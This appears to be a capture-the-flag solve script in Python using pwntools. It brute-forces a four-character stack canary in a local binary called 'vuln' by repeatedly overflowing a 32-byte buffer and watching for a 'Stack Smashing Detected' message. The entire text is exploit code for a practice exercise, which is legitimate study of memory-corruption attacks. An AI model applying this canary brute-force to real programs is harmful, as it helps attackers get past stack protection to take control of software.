# Run with this command python -c '
from pwn import *
import string

BUF_SIZE = 32
FLAG_LEN = 64
KEY_LEN  = 4

res = ""
for i in range(KEY_LEN):
    for s in string.ascii_letters + string.digits:
        with context.local(log_level="ERROR"):
            try:
                r = process("vuln")
                r.sendlineafter("Please enter the length of the entry:\n>", str(BUF_SIZE + len(res) + 1))
                r.sendlineafter("Input> ", fit({BUF_SIZE: res + s}))

                response = r.recvline()
                if b"Stack Smashing Detected" in response:
                    continue
                res += s

                print("[!] Temp Key : " + res)
                break
            finally:
                r.close()
    else:
        print "Key not found"
        exit(0)
print res
# '